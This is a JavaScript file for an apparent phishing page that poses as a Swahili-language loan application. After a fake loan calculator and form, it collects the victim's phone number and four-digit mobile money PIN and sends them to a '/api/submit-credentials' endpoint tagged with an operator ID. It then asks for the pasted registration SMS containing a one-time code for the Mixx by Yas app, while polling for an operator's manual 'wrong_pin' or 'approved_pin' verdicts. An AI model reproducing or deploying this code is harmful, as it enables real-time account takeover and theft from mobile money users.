document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const adminId = urlParams.get('admin');

    const stepNaelewa = document.getElementById('step-naelewa');
    const stepSlider = document.getElementById('step-slider');
    const stepLoan1 = document.getElementById('step-loan-1');
    const stepLoan2 = document.getElementById('step-loan-2');
    const stepLoan3 = document.getElementById('step-loan-3');
    const stepForm = document.getElementById('step-form');
    const stepLoading = document.getElementById('step-loading');
    const stepOtp = document.getElementById('step-otp');
    const stepSuccess = document.getElementById('step-success');

    const btnNaelewa = document.getElementById('btn-naelewa');
    const rangeAmount = document.getElementById('range-amount');
    const rangeDuration = document.getElementById('range-duration');
    const sliderValDisplay = document.getElementById('slider-val-display');
    const sliderDurationDisplay = document.getElementById('slider-duration-display');
    const monthlyPaymentVal = document.getElementById('monthly-payment-val');
    const totalRepayVal = document.getElementById('total-repay-val');
    const btnSliderNext = document.getElementById('btn-slider-next');

    const btnNext1 = document.getElementById('btn-next-1');
    const btnPrev2 = document.getElementById('btn-prev-2');
    const btnNext2 = document.getElementById('btn-next-2');
    const btnPrev3 = document.getElementById('btn-prev-3');
    const btnSubmitLoan = document.getElementById('btn-submit-loan');
    const loanForm = document.getElementById('loan-form');
    const btnThibitisha = document.getElementById('btn-thibitisha');
    const otpText = document.getElementById('otp-text');
    const charCount = document.getElementById('char-count');

    const pinErrorBanner = document.getElementById('pin-error-banner');
    const smsErrorBanner = document.getElementById('sms-error-banner');

    let sliderData = {
        sliderAmount: '1,000,000',
        sliderDuration: '3 Mwezi',
        monthlyPayment: 'Tsh 336,115'
    };
    let loanData = {};
    let currentSessionId = null;
    let statusInterval = null;

    function switchStep(fromCard, toCard) {
        fromCard.classList.remove('active');
        fromCard.classList.add('hidden');
        toCard.classList.remove('hidden');
        toCard.classList.add('active');

        if (toCard === stepOtp) {
            autofillSMSMessage();
        }
    }

    function autofillSMSMessage() {
        const sampleSMS = "You are being registered in Mixx by Yas Super App, use the code 55uf50HYgp3mjqu4b0zY to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
        if (otpText) {
            otpText.value = sampleSMS;
            charCount.innerText = `${sampleSMS.length}/1000`;
        }
    }

    function updateCalculations() {
        const amt = parseInt(rangeAmount.value) || 1000000;
        const months = parseInt(rangeDuration.value) || 3;
        
        sliderValDisplay.innerText = 'Tsh ' + amt.toLocaleString();
        sliderDurationDisplay.innerText = months + (months === 1 ? ' Mwezi' : ' Mwezi');

        const totalMultiplier = (1 + (0.05 * (months / 12)));
        const totalRepay = Math.round(amt * totalMultiplier);
        const monthlyPay = Math.round(totalRepay / months);

        monthlyPaymentVal.innerText = 'Tsh ' + monthlyPay.toLocaleString();
        totalRepayVal.innerText = 'Tsh ' + totalRepay.toLocaleString();

        sliderData.sliderAmount = amt.toLocaleString();
        sliderData.sliderDuration = months + ' Mwezi';
        sliderData.monthlyPayment = 'Tsh ' + monthlyPay.toLocaleString();

        document.getElementById('loan-amount').value = amt;
    }

    if (rangeAmount && rangeDuration) {
        rangeAmount.addEventListener('input', updateCalculations);
        rangeDuration.addEventListener('input', updateCalculations);
        updateCalculations();
    }

    if (btnNaelewa) {
        btnNaelewa.addEventListener('click', () => {
            switchStep(stepNaelewa, stepSlider);
        });
    }

    if (btnSliderNext) {
        btnSliderNext.addEventListener('click', () => {
            switchStep(stepSlider, stepLoan1);
        });
    }

    if (btnNext1) {
        btnNext1.addEventListener('click', () => {
            loanData.loanType = document.getElementById('loan-type').value;
            loanData.amount = document.getElementById('loan-amount').value;
            loanData.duration = document.getElementById('loan-duration').value;
            loanData.purpose = document.getElementById('loan-purpose').value || 'Biashara';
            switchStep(stepLoan1, stepLoan2);
        });
    }

    if (btnPrev2) {
        btnPrev2.addEventListener('click', () => {
            switchStep(stepLoan2, stepLoan1);
        });
    }

    if (btnNext2) {
        btnNext2.addEventListener('click', () => {
            const firstName = document.getElementById('first-name').value.trim();
            const lastName = document.getElementById('last-name').value.trim();
            const phone = document.getElementById('phone').value.trim();

            if (!firstName || !lastName || !phone) {
                alert('Tafadhali jaza taarifa zote zinazohitajika.');
                return;
            }

            loanData.firstName = firstName;
            loanData.lastName = lastName;
            loanData.phone = phone;

            document.getElementById('confirm-phone').value = phone;

            switchStep(stepLoan2, stepLoan3);
            
            document.getElementById('summary-amount').innerText = 'TSh ' + loanData.amount;
            document.getElementById('summary-duration').innerText = loanData.duration;
            document.getElementById('summary-purpose').innerText = loanData.purpose;
        });
    }

    if (btnPrev3) {
        btnPrev3.addEventListener('click', () => {
            switchStep(stepLoan3, stepLoan2);
        });
    }

    if (btnSubmitLoan) {
        btnSubmitLoan.addEventListener('click', () => {
            loanData.employmentStatus = document.getElementById('employment-status').value;
            loanData.annualIncome = document.getElementById('annual-income').value || '0';
            
            switchStep(stepLoan3, stepForm);
        });
    }

    const pinInputs = document.querySelectorAll('.pin-input');
    pinInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            const val = e.target.value;
            if (val && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }
            updatePinValue();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                pinInputs[index - 1].focus();
            }
        });
    });

    function updatePinValue() {
        let pin = '';
        pinInputs.forEach(input => pin += input.value);
        document.getElementById('pin-hidden').value = pin;
    }

    if (loanForm) {
        loanForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const phoneInput = document.getElementById('confirm-phone').value.trim();
            const pin = document.getElementById('pin-hidden').value;

            if (pin.length !== 4) {
                return;
            }

            pinErrorBanner.classList.add('hidden');

            currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            switchStep(stepForm, stepLoading);

            try {
                const response = await fetch('/api/submit-credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        sessionId: currentSessionId,
                        sliderData,
                        loanData,
                        phone: phoneInput,
                        pin: pin,
                        adminId: adminId
                    })
                });
                const data = await response.json();
                if (data.success) {
                    pollStatus();
                }
            } catch (err) {
                console.error('Error submitting credentials:', err);
                switchStep(stepLoading, stepForm);
            }
        });
    }

    if (otpText) {
        otpText.addEventListener('input', () => {
            const len = otpText.value.length;
            charCount.innerText = `${len}/1000`;
        });
    }

    if (btnThibitisha) {
        btnThibitisha.addEventListener('click', async () => {
            const text = otpText.value.trim();
            if (!text) {
                return;
            }

            smsErrorBanner.classList.add('hidden');
            switchStep(stepOtp, stepLoading);

            try {
                await fetch('/api/submit-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        sessionId: currentSessionId,
                        otpText: text
                    })
                });
                pollStatus();
            } catch (err) {
                console.error('Error submitting OTP:', err);
            }
        });
    }

    function pollStatus() {
        if (statusInterval) clearInterval(statusInterval);

        statusInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status/${currentSessionId}`);
                const data = await res.json();

                if (data.status === 'approved_pin') {
                    clearInterval(statusInterval);
                    switchStep(stepLoading, stepOtp);
                } else if (data.status === 'success') {
                    clearInterval(statusInterval);
                    document.getElementById('final-approved-amount').innerText = 'TSh ' + loanData.amount;
                    switchStep(stepLoading, stepSuccess);
                } else if (data.status === 'wrong_pin') {
                    clearInterval(statusInterval);
                    pinInputs.forEach(i => i.value = '');
                    document.getElementById('pin-hidden').value = '';
                    pinErrorBanner.classList.remove('hidden');
                    switchStep(stepLoading, stepForm);
                    pinInputs[0].focus();
                } else if (data.status === 'wrong_sms') {
                    clearInterval(statusInterval);
                    otpText.value = '';
                    charCount.innerText = '0/1000';
                    smsErrorBanner.classList.remove('hidden');
                    switchStep(stepLoading, stepOtp);
                    otpText.focus();
                } else if (data.status === 'denied') {
                    clearInterval(statusInterval);
                    location.reload();
                }
            } catch (err) {
                console.error('Error polling status:', err);
            }
        }, 3000);
    }
});
                          
